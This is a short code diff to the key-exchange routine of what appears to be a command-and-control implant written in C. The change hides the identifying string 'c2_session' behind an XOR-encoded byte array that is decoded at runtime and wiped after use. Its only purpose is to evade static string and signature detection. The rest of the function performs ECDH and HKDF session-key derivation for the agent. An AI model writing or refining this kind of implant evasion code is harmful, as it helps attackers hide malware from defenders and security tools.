@@ -289,14 +289,19 @@ BOOL agent_key_exchange(AgentState *state) {
     ecdh_free_key(my_priv);
 
     /* Derive session key via HKDF-SHA256 */
+    unsigned char hkdf_info[] = {'c'^0x5A,'2'^0x5A,'_'^0x5A,'s'^0x5A,'e'^0x5A,
+                                  's'^0x5A,'s'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A};
+    for (int _hi = 0; _hi < 10; _hi++) hkdf_info[_hi] ^= 0x5A;
     if (!hkdf_sha256(shared_secret, 32,
                      state->agent_id, UUID_SIZE,
-                     (const unsigned char *)"c2_session", 10,
+                     hkdf_info, 10,
                      state->session_key, KEY_SIZE)) {
+        SecureZeroMemory(hkdf_info, sizeof(hkdf_info));
         SecureZeroMemory(shared_secret, 32);
         free(resp_raw);
         return FALSE;
     }
+    SecureZeroMemory(hkdf_info, sizeof(hkdf_info));
     SecureZeroMemory(shared_secret, 32);
     state->has_session_key = TRUE;
 
